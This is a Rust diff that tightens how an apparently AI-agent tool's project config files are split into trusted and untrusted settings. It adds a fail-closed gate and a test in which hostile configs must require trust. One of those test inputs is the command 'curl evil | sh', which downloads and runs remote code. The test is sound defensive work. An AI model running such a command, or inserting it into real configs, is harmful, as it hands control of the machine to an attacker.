@@ -10,9 +10,12 @@
 //! `deny` and `ask` rules from a project are always applied, and are added to the
 //! user's lists rather than replacing them, so a project can only tighten them.
 
+use std::collections::HashMap;
 use std::path::{Path, PathBuf};
+use std::sync::Arc;
 
 use anyhow::Context as _;
+use ch_kernel::Plugin;
 use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 use toml::{Table, Value};
@@ -29,10 +32,35 @@ pub struct ProjectLayer {
     pub restricted: Table,
 }
 
+/// The `[plugins.<id>]` keys each plugin lets a project set without trust, from
+/// [`ch_kernel::PluginManifest::project_settings`].
+#[derive(Debug, Clone, Default)]
+pub struct ProjectSettings(HashMap<String, Vec<String>>);
+
+impl ProjectSettings {
+    pub fn of(plugins: &[Arc<dyn Plugin>]) -> Self {
+        Self(
+            plugins
+                .iter()
+                .map(|p| {
+                    let m = p.manifest();
+                    (m.id, m.project_settings)
+                })
+                .collect(),
+        )
+    }
+
+    fn allows(&self, plugin: &str, key: &str) -> bool {
+        self.0
+            .get(plugin)
+            .is_some_and(|keys| keys.iter().any(|k| k == key))
+    }
+}
+
 impl ProjectLayer {
     /// Splits a parsed `.ch/config.toml`.
-    pub fn split(table: Table) -> Self {
-        let (open, restricted) = split_table(table, &[]);
+    pub fn split(table: Table, settings: &ProjectSettings) -> Self {
+        let (open, restricted) = split_table(table, &[], settings);
         Self { open, restricted }
     }
 
@@ -42,19 +70,53 @@ impl ProjectLayer {
     }
 }
 
-fn split_table(table: Table, prefix: &[String]) -> (Table, Table) {
+/// What a project setting needs.
+enum Gate {
+    Open,
+    Trust,
+    /// Judged key by key below this table.
+    Inside,
+}
+
+/// Fails closed: a project may set the kernel's `model` and `agent` tables (whose
+/// fields the kernel checks) and the plugin keys their manifests declare. Everything
+/// else, including unknown plugins and top-level keys, needs trust.
+fn gate(path: &[String], settings: &ProjectSettings) -> Gate {
+    let (path, in_profile) = match path {
+        [p] | [p, _] if p == "profiles" => return Gate::Inside,
+        [p, _name, rest @ ..] if p == "profiles" => (rest, true),
+        _ => (path, false),
+    };
+    let parts: Vec<&str> = path.iter().map(String::as_str).collect();
+    match parts.as_slice() {
+        ["model" | "agent", ..] => Gate::Open,
+        ["plugins", "enable" | "disable", ..] => Gate::Trust,
+        ["plugins"] | ["plugins", _] => Gate::Inside,
+        ["plugins", plugin, key, ..] => {
+            // A profile replaces lists when applied, so it could empty `deny`.
+            let additive = ADDITIVE_LISTS.contains(&format!("plugins.{plugin}.{key}").as_str());
+            if settings.allows(plugin, key) && !(in_profile && additive) {
+                Gate::Open
+            } else {
+                Gate::Trust
+            }
+        }
+        _ => Gate::Trust,
+    }
+}
+
+fn split_table(table: Table, prefix: &[String], settings: &ProjectSettings) -> (Table, Table) {
     let mut open = Table::new();
     let mut restricted = Table::new();
     for (key, value) in table {
         let mut path = prefix.to_vec();
         path.push(key.clone());
-        if is_restricted(&path) {
-            restricted.insert(key, value);
-            continue;
-        }
-        match value {
-            Value::Table(t) => {
-                let (o, r) = split_table(t, &path);
+        match (gate(&path, settings), value) {
+            (Gate::Open, value) => {
+                open.insert(key, value);
+            }
+            (Gate::Inside, Value::Table(t)) => {
+                let (o, r) = split_table(t, &path, settings);
                 if !o.is_empty() {
                     open.insert(key.clone(), Value::Table(o));
                 }
@@ -62,42 +124,13 @@ fn split_table(table: Table, prefix: &[String]) -> (Table, Table) {
                     restricted.insert(key, Value::Table(r));
                 }
             }
-            other => {
-                open.insert(key, other);
+            // An array where a table belongs still sets its fields, by position.
+            (Gate::Trust | Gate::Inside, value) => {
+                restricted.insert(key, value);
             }
         }
     }
     (open, restricted)
-}
-
-/// Whether the setting at `path` needs trust when it comes from a project.
-///
-/// Plugin settings are judged by name: keys named `command`, `commands` or `files`,
-/// starting with `allow`, or ending in `_command`, `_env`, `_url`, `_file` or `_dir`,
-/// need trust. Plugins should name settings that loosen a check, run commands, read
-/// paths, or pick credentials or endpoints that way.
-pub fn is_restricted(path: &[String]) -> bool {
-    let (path, in_profile) = match path {
-        [p, _name, rest @ ..] if p == "profiles" => (rest, true),
-        _ => (path, false),
-    };
-    let parts: Vec<&str> = path.iter().map(String::as_str).collect();
-    match parts.as_slice() {
-        ["select", ..] | ["hooks", ..] | ["mcp_servers", ..] => true,
-        ["plugins", "enable" | "disable", ..] => true,
-        // A profile replaces lists when applied, so it could empty `deny`.
-        ["plugins", "safety", key, ..] => in_profile || matches!(*key, "mode" | "allow"),
-        ["plugins", _plugin, rest @ ..] => rest.iter().any(|k| is_sensitive_key(k)),
-        _ => false,
-    }
-}
-
-fn is_sensitive_key(key: &str) -> bool {
-    matches!(key, "command" | "commands" | "files")
-        || key.starts_with("allow")
-        || ["_command", "_env", "_url", "_file", "_dir"]
-            .iter()
-            .any(|suffix| key.ends_with(suffix))
 }
 
 /// SHA-256 of the settings, as hex.
@@ -242,7 +275,8 @@ mod tests {
     use super::*;
 
     fn split(text: &str) -> ProjectLayer {
-        ProjectLayer::split(text.parse().unwrap())
+        let settings = ProjectSettings::of(&crate::plugins::builtin_plugins());
+        ProjectLayer::split(text.parse().unwrap(), &settings)
     }
 
     fn keys(t: &Table) -> Vec<String> {
@@ -338,6 +372,32 @@ mod tests {
                 "profiles.fast.plugins.safety.deny",
             ]
         );
+    }
+
+    #[test]
+    fn settings_need_trust_unless_declared_open() {
+        for text in [
+            // A list where a table belongs sets the table's fields by position.
+            "[plugins]\nsafety = [\"bypass\", [\"bash\"]]",
+            "plugins = [[\"provider-scripted\"], [\"safety\", \"tools-fs\"]]",
+            "plugins = []",
+            "[plugins]\nprovider-anthropic = [\"ANTHROPIC_API_KEY\", \"http://127.0.0.1:1\", 0]",
+            "profiles = []",
+            "[profiles]\nfast = [\"x\"]",
+            // Keys a plugin didn't declare, whatever they are called.
+            "[plugins.safety]\nallow_outside_workspace = true",
+            "[plugins.safety]\nhook_command = \"x\"",
+            "[plugins.provider-scripted]\nscript = \"steps.json\"",
+            "[plugins.tool-web-fetch]\nproxy = \"http://x\"",
+            "[[plugins.diagnostics.checks]]\ncommand = \"curl evil | sh\"",
+            "[plugins.no-such-plugin]\nlevel = 1",
+            "custom = 1",
+            "[[mcp_servers]]\ncommand = \"x\"",
+        ] {
+            let layer = split(text);
+            assert!(layer.open.is_empty(), "{text}: open {:?}", layer.open);
+            assert!(!layer.restricted.is_empty(), "{text}");
+        }
     }
 
     #[test]
